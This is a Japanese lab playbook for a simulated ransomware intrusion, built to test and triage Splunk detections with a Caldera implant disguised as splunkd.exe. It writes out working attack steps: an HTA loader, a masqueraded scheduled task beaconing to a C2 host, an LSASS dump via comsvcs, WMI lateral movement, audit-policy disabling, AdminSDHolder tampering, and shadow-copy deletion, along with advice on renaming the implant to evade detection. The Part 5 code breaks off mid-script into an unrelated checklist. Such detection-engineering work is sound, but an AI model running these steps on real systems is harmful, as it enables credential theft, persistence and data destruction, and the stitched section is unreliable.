# キルチェーン版 攻撃ストーリー #02 — ar-win1 起点の人手ランサムウェア

story-01 は「各 ESCU ルールが当たるか」を 1 本ずつ確かめる検証用だった。問題は、どのコマンドも
`explorer.exe → powershell.exe`（＝人が端末の前で叩いた形）で実行していたこと。これだと生ログは出ても、
アナリストから見ると「管理者の正常作業」と区別がつかない。

このストーリーは同じ 5 検知（#1/#3/#4/#5/#6）を、**1 つの人手ランサムウェア侵入の流れの中**で、
**マルウェア（インプラント）配下のプロセスツリー**として発生させる。狙いは 2 つ：

1. **プロセスの出自で「攻撃」と言い切れるようにする** … 親が `C:\Temp\splunkd.exe`（正規の splunkd を騙る実体）で、
   実行ユーザー・時間帯・連鎖がそろえば、「管理者がやったのかも」は消える。
2. **解析は個別・レポートは一連**という実務の型をなぞる … Part 3 で各アラートを単体トリアージし、Part 1 で通しのタイムラインにまとめる。

> **使い分け**：story-01（検証）＝ルールが技術的に当たるかの確認。story-02（本書）＝攻撃としての説得力を作り、
> 解析〜レポートの練習台にする。story-01 を壊さず、こちらを別建てで積む。

---

## ラボ前提（この筋書きで使うもの）

| ホスト | 役割 | IP | この物語での立ち位置 |
|---|---|---|---|
| ar-win1 | Win11 クライアント | 10.0.1.15 | 初期侵害端末（踏み台） |
| ar-dc | DC（Server 2022） | 10.0.1.14 | 最終目標（ドメイン支配） |
| ar-srv | メンバーサーバー | 10.0.1.17 | ファイルサーバー見立て（収集・破壊の対象） |
| ar-win2 | Win11 クライアント | 10.0.1.16 | 横展開の二次端末（任意） |
| Caldera | C2 サーバー | 10.0.1.70 | 攻撃者インフラ。エージェント＝`C:\Temp\splunkd.exe` |

- 全 Windows に Caldera エージェント（`C:\Temp\splunkd.exe`、タスク名 `CalderaAgent`）と
  Sysmon（`AttackRangeSysmon.xml`、EventID 1 が ParentImage/ParentCommandLine を記録）、4688＋コマンドライン監査が入っている。
- **インプラント配下で動かす**のが本書の肝。Caldera のアビリティとして実行すると、生成プロセスの親が
  `splunkd.exe` になる。Caldera を使わない場合の代替は各ステップの「ラボでの出し方（B案）」に書く。

### splunkd.exe を騙るインプラント＝それ自体が検知材料

`C:\Temp\splunkd.exe` は Caldera の sandcat エージェント。正規の splunkd は `C:\Program Files\Splunk\bin\splunkd.exe`
なので、**名前は splunkd だが場所と署名が違う**。これは「正規プロセス名のなりすまし（T1036.005）」そのもの。
ハント条件の種になる：

```
index=win source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\splunkd.exe"
| where NOT like(Image,"%\\Program Files\\Splunk\\%")
| stats count values(ParentImage) values(CommandLine) by Computer, Image
```

> 注意：story-01 の表（escu-selection.md 112 行）にあるとおり、ESCU の「Suspicious Process File Path」ルールは
> `\temp\` を**除外**しているので、`C:\Temp\splunkd.exe` 自体はそのルールでは当たらない（ラボ固有の穴）。
> だからこそ上の「splunkd の場所違い」ハントを自前で持つ意味がある。

---

## Part 1 — 侵入タイムライン（レポート用・一連の流れ）

人手ランサムウェアの定石どおりに並べた。★ が story の 5 検知、◯ が物語をつなぐグルー（別の ESCU にも当たるが本筋の対象外）。

| # | フェーズ | ホスト | ATT&CK | 親プロセス（本物らしさの核） | 検知 |
|---|---|---|---|---|---|
| 1 | 初期アクセス（添付実行） | ar-win1 | T1566 / T1204 / T1218.005 | `explorer → mshta → powershell` | ◯ LOLBin |
| 2 | C2 確立（ビーコン） | ar-win1 | T1071 / T1105 | `powershell → splunkd.exe` | ◯ なりすまし |
| 3 | 探索 | ar-win1 | T1087 / T1018 / T1482 | `splunkd.exe → whoami/nltest/net` | ◯ Discovery |
| 4 | **永続化（タスク）** | ar-win1 | T1053.005 | `splunkd.exe → schtasks.exe` | **★ #4** |
| 5 | 認証情報アクセス | ar-win1 | T1003.001 | `splunkd.exe → rundll32 comsvcs` | ◯ LSASS |
| 6 | 横展開（DC へ） | ar-win1→ar-dc | T1021 / T1047 | DC 側 `WmiPrvSE.exe → cmd` | ◯（Palo #2 の検知点） |
| 7 | **防御回避（監査停止）** | ar-dc | T1562.002 / T1685 | `WmiPrvSE/splunkd → auditpol` | **★ #1** |
| 8 | **AD 永続化（SDHolder）** | ar-dc | T1546 系 | `WmiPrvSE/splunkd → powershell` | **★ #6** |
| 9 | **収集（圧縮）** | ar-srv/ar-win1 | T1560.001 / T1074 | `splunkd.exe → powershell Compress-Archive` | **★ #3** |
| 10 | 情報持ち出し | ar-win1→外部 | T1041 | `splunkd.exe`（C2 経由） | ◯（Palo #2 内→外） |
| 11 | **破壊（ランサムノート）** | ar-srv/ar-win1 | T1486 / T1490 | `splunkd.exe → locker（ノート撒き＋VSS削除）` | **★ #5** |

**一連のストーリー（レポート本文の下書き）**

> ar-win1 の利用者が添付ファイル（HTA ローダー）を開いたことを起点に、`mshta → powershell` でステージャが起動し、
> `C:\Temp\splunkd.exe` を騙るインプラントが C2（10.0.1.70）へビーコンした。攻撃者はインプラント配下で端末とドメインを探索し、
> 再起動耐性のためスケジュールタスクを登録（#4）。LSASS からドメイン管理者級の資格情報を取得し、WMI で ar-dc へ横展開した。
> DC 上ではまず監査の一部を停止して痕跡を薄め（#1）、AdminSDHolder を改ざんして隠れた特権復活の仕掛けを残した（#6）。
> その後、ar-srv 上の業務データを Temp に圧縮して収集し（#3）、C2 経由で外部へ持ち出したうえ、
> 多数のフォルダへ同一のランサムノートを撒き、ボリュームシャドウを削除して復旧を妨害した（#5）。
> **攻撃者の監査停止は不完全で、「ディレクトリサービスの変更（5136）」を潰し忘れたため、AD 永続化は検知できた。**

この「不完全な防御回避のおかげで AD 永続化を捕捉できた」という筋は、レポートの "Detection opportunity" として強い。

---

## Part 2 — 実行プレイブック（ラボでの出し方）

各フェーズを「A案＝Caldera（親が splunkd.exe になる・推奨）」「B案＝手動（Caldera 無しでも親を本物らしくする）」で示す。
**本物らしさの核は "親プロセス" と "実行ユーザー"** なので、そこを毎回確認する。

### 準備

- Caldera サーバー（10.0.1.70）が起動し、ar-win1/ar-dc/ar-srv のエージェントが check-in していること（A案の前提）。
- Defender が有効だと LSASS ダンプ（#5 フェーズ）や一部 LOLBin がブロックされ得る。**テレメトリ生成が目的**なので、
  ブロックされたらそれ自体を 1 検知として記録しつつ、必要なら対象フォルダを一時除外する（実機判断）。
- 破壊フェーズは **本物のランサムは絶対に動かさない**。ノート撒き＋`vssadmin delete shadows` の挙動だけを再現する。

### フェーズ 1：初期アクセス（ar-win1、利用者セッション）

Office が無いので、maldoc の代わりに **HTA ローダー**で `mshta → powershell` を作る。

```powershell
# 攻撃者が送りつけた添付に見立てた HTA を置いて実行（利用者が開いた体）
$hta = "$env:USERPROFILE\Downloads\invoice_2026.hta"
@'
<html><head><script language="VBScript">
Set s = CreateObject("WScript.Shell")
s.Run "powershell -NoProfile -WindowStyle Hidden -Command ""$log=$env:TEMP+'\stage.txt'; 'staged ' + (whoami) | Out-File $log""", 0, False
Close
</script></head><body></body></html>
'@ | Out-File -FilePath $hta -Encoding ascii
mshta.exe $hta
```

- **できるツリー**：`explorer.exe → mshta.exe invoice_2026.hta → powershell.exe -WindowStyle Hidden ...`
- 本物らしさ：`mshta` が `Downloads\*.hta` を実行し、その子が隠しウィンドウの powershell。管理者の通常作業ではまず出ない形。
- 確認 SPL：
  ```
  index=win EventCode=1 Image="*\\powershell.exe" ParentImage="*\\mshta.exe"
  | table _time Computer User ParentCommandLine CommandLine
  ```

### フェーズ 2：C2 確立（ar-win1）

ラボでは「ステージャがインプラントを起動」＝**Caldera エージェントを powershell から起こす**ことで表現する。
既にタスク `CalderaAgent` で常駐しているなら、ここは「ビーコン＝インプラントが活動開始」とみなして次へ進んでよい。
明示的に powershell の子として起こすなら：

```powershell
# ステージャがインプラントを起動した体（親が powershell になる）
Start-Process "C:\Temp\splunkd.exe" -ArgumentList "-server","http://10.0.1.70:8888"
```

- **できるツリー**：`powershell.exe → splunkd.exe（C:\Temp）`
- これ以降の A案コマンドは、Caldera のアビリティとして流すと**親が `splunkd.exe`** になる。ここが story-01 と決定的に違う点。

### フェーズ 3：探索（ar-win1、Caldera アビリティ＝親 splunkd.exe）

Caldera の Discovery アビリティ（または下記コマンドをアビリティ化）で流す。

```
whoami /all
nltest /dclist:attackrange
net group "Domain Admins" /domain
```

- **できるツリー**：`splunkd.exe → cmd.exe → nltest.exe` など。story-01 なら親が explorer だったところが splunkd になる。

### フェーズ 4：永続化 ★#4（ar-win1、親 splunkd.exe）

story-01 の `CrimsonUpdater` を、**紛れる名前・ProgramData 経由**に格上げし、**インプラント配下**で登録する。

```powershell
# A案：Caldera アビリティとして実行（親が splunkd.exe になる）。B案：下記を splunkd から起こした cmd で実行
$dir = "C:\ProgramData\MicrosoftEdgeUpdate"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
'powershell -NoProfile -WindowStyle Hidden -Command "iwr http://10.0.1.70:8888/beacon -UseBasicParsing"' |
  Out-File "$dir\update.ps1" -Encoding ascii
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineCore" `
  /tr "powershell -NoProfile -WindowStyle Hidden -File C:\ProgramData\MicrosoftEdgeUpdate\update.ps1" `
  /sc minute /mo 30 /ru SYSTEM /f
```

- **検知**：ESCU「Windows Scheduled Task with Suspicious Command」（4698/4700/4702、`tool=shell command use`）。
- **story-01 からの格上げ**：
  - タスク名が正規アップデータに擬態（`CrimsonUpdater` のような露骨な名前をやめる）→ 名前ベース検知は回避、**コマンド**ベース検知で捕まえる筋に変わる。
  - **4698 の Caller は利用者 or SYSTEM だが、`schtasks.exe` の親（Sysmon 1）が `splunkd.exe`** → 「人が RDP で入って作った」線が消える。
- 後片付け：`schtasks /delete /tn "MicrosoftEdgeUpdateTaskMachineCore" /f` と `Remove-Item $dir -Recurse -Force`

### フェーズ 5：認証情報アクセス（ar-win1、親 splunkd.exe）

ドメイン管理者級の資格情報を奪い、横展開の燃料にする（物語のつなぎ）。Defender が有効だとブロックされ得るので、
**テレメトリ（Sysmon 10 / 4688 のコマンドライン）を出すこと**を目的に、ダンプ先を無害な名前にする。

```powershell
# comsvcs.dll の MiniDump で LSASS をダンプ（親 splunkd.exe → rundll32）
$p = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\ProgramData\s.bin full
```

- **できるツリー**：`splunkd.exe → rundll32.exe comsvcs.dll MiniDump`
- 検知（ESCU 多数ヒット想定）：`Windows Credential Dumping via comsvcs`, `ProcessAccess to lsass` 等。ブロックされたら Defender の 1116/1117 も証跡。
- 後片付け：`Remove-Item C:\ProgramData\s.bin -Force -ErrorAction SilentlyContinue`

### フェーズ 6：横展開（ar-win1 → ar-dc）

奪った管理者資格情報で DC へリモート実行。**WMI を使うと DC 側の生成プロセスの親が `WmiPrvSE.exe`** になり、
「遠隔から実行された」ことがプロセスツリーに刻まれる（横展開の決定的証跡）。

```powershell
# ar-win1 から DC へ WMI でコマンド実行（資格情報は奪取したドメイン管理者を使う体）
$cred = Get-Credential   # ATTACKRANGE\AzureAdmin（ラボでは既知）
Invoke-CimMethod -ComputerName 10.0.1.14 -ClassName Win32_Process -MethodName Create `
  -Arguments @{ CommandLine = "cmd /c whoami > C:\Windows\Temp\lm.txt" } -OperationTimeoutSec 30
```

- **できるツリー（DC 側）**：`WmiPrvSE.exe → cmd.exe → whoami`
- **Palo #2 の検知点**：この ar-win1→ar-dc（内部→内部）の通信が、Palo があれば脅威ログに出る想定。ラボでは Palo 無しなのでサンプル投入で代替（story-01 の #2 と同じ扱い）。
- 以降の DC 上の攻撃（#1/#6）は、この WMI 経由（親 WmiPrvSE）か、DC の Caldera エージェント（親 splunkd.exe）で流す。どちらも「対話セッションでない」点が重要。

### フェーズ 7：防御回避 ★#1（ar-dc、親 WmiPrvSE または splunkd.exe）

痕跡隠しに監査の一部を止める。**ただし "Directory Service Changes" は止めない**（止めると #6 の 5136 が消える）。
これは「攻撃者の防御回避が不完全だった」という検知機会を意図的に残す設計。

```powershell
# DC 上で（WMI 経由 or Caldera アビリティ）。ログオン系の監査を潰す＝自分のログオンを隠す体
auditpol /set /subcategory:"Credential Validation" /success:disable /failure:disable
```

- **検知**：story-01 で改変済みの ESCU #1（`host=ar-dc`、4719 の `%%8448/%%8450`）。
- **story-01 からの格上げ**：`auditpol.exe` の親が `WmiPrvSE.exe`（遠隔）または `splunkd.exe`（インプラント）。
  対話的な管理作業なら親は `explorer/powershell` のはず → 親プロセスだけで「これは攻撃」と言える。
- 後片付け：`auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable`

### フェーズ 8：AD 永続化 ★#6（ar-dc、親 WmiPrvSE または splunkd.exe）

AdminSDHolder を改ざんし、`labuser1` に隠れた特権復活経路を仕込む。事前設定（SACL 付与）は story-01 の
修正版手順（`Set-Acl` ＋ `ActiveDirectoryAuditRule`、WriteDacl/WriteProperty/Success）を先に済ませておくこと。

```powershell
# labuser1 に AdminSDHolder へ GenericAll（攻撃側の /G は正しく動く）
$dn = "CN=AdminSDHolder,CN=System," + ([ADSI]"LDAP://RootDSE").defaultNamingContext
dsacls "$dn" /G "ATTACKRANGE\labuser1:GA"
```

- **検知**：ESCU #6（5136、`ObjectDN=CN=AdminSDHolder`、`nTSecurityDescriptor`、`%%14674/%%14675`）。
- **story-01 からの格上げ**：`SubjectUserName` は奪取した管理者（AzureAdmin）だが、変更が**遠隔実行の文脈**で、
  しかも直前に監査停止（#1）→ 直後に SDHolder 改ざん（#6）という**連鎖**で出る。単発の 5136 より遥かに「攻撃」。

### フェーズ 9：収集 ★#3（ar-srv または ar-win1、親 splunkd.exe）

持ち出し前にデータをステージング＆圧縮。

```powershell
# A案：Caldera アビリティ（親 splunkd.exe）。業務データ見立てを Temp に圧縮
$stage = "C:\Users\Public\stage"
New-Item -ItemType Directory -Force -Path $stage | Out-Null
1..10 | ForEach-Object { "confidential record $_" | Out-File "$stage\rec$_.txt" }
Compress-Archive -Path "$stage\*" -DestinationPath "C:\Windows\Temp\exfil.zip" -Force
```

- **検知**：ESCU #3（4104、`Compress-Archive` ＋ `\Temp\`）。
- **story-01 からの格上げ**：親が `splunkd.exe`。かつ収集→持ち出し→破壊の文脈に乗る。
- 後片付け：`Remove-Item C:\Windows\Temp\exfil.zip,$stage -Recurse -Force`

### フェーズ 10：情報持ち出し（ar-win1 → 外部）

C2 経由で外部へ送る（Palo があれば内→外の脅威/トラフィックに出る）。ラボでは Caldera の exfil アビリティ、
または単純な外向き HTTP で代替。**Palo #2 の "内→内→外" の "外" の部分**がここ。

### フェーズ 11：破壊 ★#5（ar-srv/ar-win1、親 splunkd.exe）

**本物のランサムは動かさない。** ノート撒き＋シャドウ削除の挙動だけを、インプラント配下で再現する。

```powershell
# A案：Caldera アビリティ（親 splunkd.exe）。同名ノートを多数フォルダへ＋VSS 削除
$note = "RESTORE_FILES.txt"
1..20 | ForEach-Object {
  $dir = "C:\Users\Public\victim\dir$_"
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  "Your files were encrypted. (LAB TEST - no real impact)" | Out-File (Join-Path $dir $note) -Encoding ascii
}
vssadmin delete shadows /all /quiet   # T1490 復旧妨害（挙動のみ。親 splunkd.exe が重要）
```

- **検知**：ESCU #5（Sysmon 11、同名 `dc(TargetFilename) >= 15`）＋ ESCU の「vssadmin delete shadows」系（T1490）。
- **story-01 からの格上げ**：ノートを書く親が `splunkd.exe`（対話 powershell ではない）。`vssadmin` が連続する点も込みで「ランサム実行」の絵。
- 後片付け：`Remove-Item C:\Users\Public\victim -Recurse -Force`

---

## Part 3 — アラート解析カード（個別トリアージ）

アナリストは 1 本ずつアラートを受け取る。各カードは「単体で見たときに攻撃と断じる根拠（＝親プロセス・ユーザー・時間・連鎖）」と、
「次に何をピボットするか」をまとめる。最終レポートでは Part 1 のタイムラインに束ねる。

### カード #4（永続化：Scheduled Task Suspicious Command）
- **発火内容**：4698 で powershell を実行するタスク登録。コマンドが `ProgramData\...\update.ps1`。
- **攻撃と断じる根拠**：`schtasks.exe`（または taskeng）の **親が `C:\Temp\splunkd.exe`**（Sysmon 1）。正規管理作業なら親は explorer/mmc/powershell。
- **誤検知の切り分け**：OneDrive/Defender の正規タスク（story-01 で見た 4702 群）は親が svchost/正規パス。フィルターマクロで除外済みか確認。
- **ピボット**：`splunkd.exe` の出自（場所違い splunkd ハント）→ 同端末の C2 通信 → 同時間帯の探索コマンド。

### カード #1（防御回避：AD Audit Policy Disabled）
- **発火内容**：ar-dc で 4719、`AuditPolicyChanges=%%8448/%%8450`（Success/Failure removed）。
- **攻撃と断じる根拠**：`auditpol.exe` の **親が `WmiPrvSE.exe`（遠隔）** または `splunkd.exe`。DC に対話ログオンした管理者の作業ではない。
- **ピボット**：直前の ar-win1→ar-dc 横展開（WMI/4624 Type3、Palo の内→内）→ 直後の 5136（#6）。**監査停止の直後に AD 改変が来ていないか**を必ず見る。

### カード #6（AD 永続化：AdminSDHolder ACL Modified）
- **発火内容**：5136、`CN=AdminSDHolder`、`nTSecurityDescriptor` 改変、`%%14674/%%14675`。
- **攻撃と断じる根拠**：AdminSDHolder の ACL は平時ほぼ変わらない。変更が**遠隔実行の文脈**＋**直前に監査停止**という連鎖。
- **ピボット**：どの SID に権限が付いたか（`labuser1`）→ そのアカウントのその後の挙動 → AdminSDHolder 伝播（60 分周期）で実際に特権が付くか。

### カード #3（収集：Archive via PowerShell）
- **発火内容**：4104、`Compress-Archive` で `\Temp\` へ出力。
- **攻撃と断じる根拠**：親が `splunkd.exe`。出力先が Temp（正規のバックアップは普通 Temp に吐かない）。
- **ピボット**：圧縮対象フォルダ（何を盗もうとしたか）→ 直後の外向き通信（持ち出し）→ 同インプラントの他ホスト活動。

### カード #5（破壊：Ransomware Notes bulk creation）
- **発火内容**：Sysmon 11、同名ノートを 15+ フォルダ。近傍に `vssadmin delete shadows`。
- **攻撃と断じる根拠**：短時間に同名ファイルを多数フォルダへ＝ランサムの撒き方。書いた親が `splunkd.exe`。シャドウ削除が併発。
- **ピボット**：撒かれた範囲（被害ホスト数）→ 暗号化拡張子の有無 → バックアップの生死（復旧可否の判断）。

### カード #2（Palo：code injection 内→内→外）※ラボでは保留
- story-01 と同じく Palo 不在。サンプルログ投入で SPL・DataModel 経路のみ確認。本書のフェーズ 6/10 がこのルールの検知点に対応。

---

## Part 4 — 巻き添え検知（この攻撃で本命以外に光る ESCU ルール）

本命は #1/#3/#4/#5/#6 だが、キルチェーンの各フェーズは**他の ESCU ルールの検知面にも触れる**。
レポートで「この侵入は N 本の検知に触れた」と言えると厚みが出るし、トリアージの相関先にもなる。

> **前提（重要）**：ESCU ルールは既定で全て無効。下記は「**有効化すれば**光る」候補。
> さらに `tstats` ベースのルールは **CIM データモデル（Endpoint など）のアクセラレーション**が要る。
> ラボは生サーチ中心なので、tstats 系はアクセラレーション設定が無いと 0 件になり得る（story-01 の troubleshooting 参照）。
> ルール名は本リポジトリの `docs/escu/escu_5180_classified.csv` 由来の実在名。

| フェーズ | 攻撃の挙動 | 巻き添えで光る実在 ESCU ルール（例） | 条件・注意 |
|---|---|---|---|
| 1 初期アクセス | `mshta` で HTA 実行 | Detect mshta inline hta execution / Detect MSHTA Url in Command Line / Mshta spawning Rundll32 OR Regsvr32 Process | HTA の起動形による |
| 1 ステージャ | 隠し窓 powershell＋外部取得 | PowerShell - Connect To Internet With Hidden Window / Malicious PowerShell Process - Encoded Command / Powershell Fileless Script Contains Base64 Encoded Content | `-enc`/`-WindowStyle Hidden`/base64 を使った場合 |
| 3 探索 | whoami / nltest / net group | Check Elevated CMD using whoami / Domain Controller Discovery with Nltest / NLTest Domain Trust Discovery | nltest のオプション次第 |
| 3 探索（WMI版） | wmic で列挙 | Domain Account Discovery with Wmic / Domain Group Discovery With Wmic / Elevated Group Discovery With Wmic / Remote System Discovery with Wmic | wmic を使った場合 |
| 4 永続化 | ProgramData へタスク | **WinEvent Scheduled Task Created Within Public Path**（ProgramData パスで確実に併発）/ Schedule Task with HTTP Command Arguments | update.ps1 に http が入るので後者も候補。名前が擬態なので「Randomly Generated Scheduled Task Name」は**当たらない** |
| 5 認証情報 | comsvcs で LSASS ダンプ | **Dump LSASS via comsvcs DLL**（直撃）/ Access LSASS Memory for Dump Creation / Detect Credential Dumping through LSASS access / Create Remote Thread into LSASS | Sysmon 10/8 が要るものあり。Defender がブロックすれば 1116/1117 も |
| 6 横展開 | WMI で DC 実行 | Remote System Discovery with Wmic / Possible Lateral Movement PowerShell Spawn / Domain Controller Discovery with Wmic | 実行手段による。Palo があれば内→内の脅威ログ |
| 9 収集 | Compress-Archive | （本命 #3）＋ IcedID Exfiltrated Archived File Creation | アーカイブ生成の相関 |
| 10 持ち出し | アーカイブを HTTP POST | Multiple Archive Files Http Post Traffic | Web/Proxy ログが要る（ラボでは Palo 相当が無いので保留） |
| 11 破壊 | vssadmin delete shadows | **Deleting Shadow Copies**（直撃・T1490） | ランサム破壊の定番。#5 と併発させる価値大 |

### ラボ固有の恒常的な誤検知（攻撃と無関係に光る）
- **WinEvent Scheduled Task Created Within Public Path**：Caldera エージェントのタスク（`C:\Temp\splunkd.exe`）が
  build のたびに当たる（escu-selection.md 130 行）。本物のタスク永続化と紛れるので、トリアージ時は親・パスで切り分ける。
- **#4 の OneDrive / Defender タスク**：story-01 で見た 4702 群（`C:\Users\...` / `C:\ProgramData\...` の正規タスク）。
  フィルターマクロで除外する。
- **splunkd なりすまし**：ESCU「Suspicious Process File Path」は `\temp\` 除外のため `C:\Temp\splunkd.exe` を**見逃す**。
  本書冒頭の「場所違い splunkd ハント」で補う。

### レポートでの使い方
- 本命 5 検知＝「確定した攻撃の節目」。巻き添え検知＝「同一インシデントの傍証」。両者を Part 1 のタイムラインに時刻で束ねると、
  1 つの侵入が複数の検知面に一貫して現れたことを示せる（＝アナリストの相関が正しかったことの裏付け）。

---

## Part 5 — 親プロセスを差し替える（インプラントの名前・置き場所を変える）

`splunkd.exe` は本家 `caldera_agent/tasks/windows.yml` が `C:\Temp\splunkd.exe` 決め打ちで置いているだけ。
エージェント（sandcat）は **任意のファイル名・パスで配置して起動できる**ので、そこから生まれる子プロセスの親を自由に変えられる。
ここでは「正規っぽい名前・パスに擬態させる」版を作る。狙いは **名前・パスだけに頼る検知を意図的にすり抜けさせ、
"では何で捕まえるか" を検証すること**（＝検知エンジニアリングの練習）。

> 本節は認可済みの自ラボ（個人サブスク・隔離 VNet）での検証用。実環境の回避手段としてではなく、
> **自分の検知ルールの穴を見つけるため**に使う。必ず後片付けして元に戻す。

### 仕組み

本家のインストールは要するに次の 3 つ（windows.yml）：
1. Caldera サーバーから sandcat バイナリを取得（HTTP ヘッダ `file: sandcat.go` / `platform: windows`）。
2. 任意パスに書き出す（本家は `C:\Temp\splunkd.exe`）。
3. `-server http://10.0.1.70:8888 -group <グループ>` で起動すると C2 に check-in する。

このうち **2 のパス・ファイル名を変える**だけで、以降その agent 配下で実行したアビリティの `ParentImage` が変わる。
既存の `CalderaAgent` タスク（`C:\Temp\splunkd.exe`）はそのまま残し、**別名の 2 本目**を立てる。

### 手順（対象端末、例として ar-win1。SYSTEM 相当の管理者 PowerShell）

擬態名の例として、実在する正規サービスに寄せる（Adobe の更新サービス `armsvc.exe` を騙る体）。
**名前も置き場所も正規に寄せる**のがこの手の肝。

```powershell
# 1) 擬態先のディレクトリ（正規ソフトが使いそうな場所）
$dir = "C:\ProgramData\Adobe\ARM"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$impl = Join-Path $dir "armsvc.exe"

# 2) ラボの Caldera から sandcat を取得して、擬態名で書き出す（本家 windows.yml と同じ取得法）
$server = "http://10.0.1.70:8888"

- Caldera エージェントが各ホストで check-in 済みか（A案の前提）。落ちていれば `SCHTASKS /RUN /TN CalderaAgent` で起動。
- Defender の挙動（フェーズ 5・一部 LOLBin）。ブロックされた場合は「それも検知」として記録し、必要分だけ一時除外。
- 各フェーズ後に **親プロセス（Sysmon 1 の ParentImage）** を必ず確認してから次へ。本物らしさの核はそこ。
- 全フェーズの後片付けコマンドを流し、ラボを元に戻す（タスク・ノート・zip・SACL・監査設定）。
- このストーリーで出した各検知を story-01 の検証記録と区別して、本書 Part 3 のカードに実測を追記する。
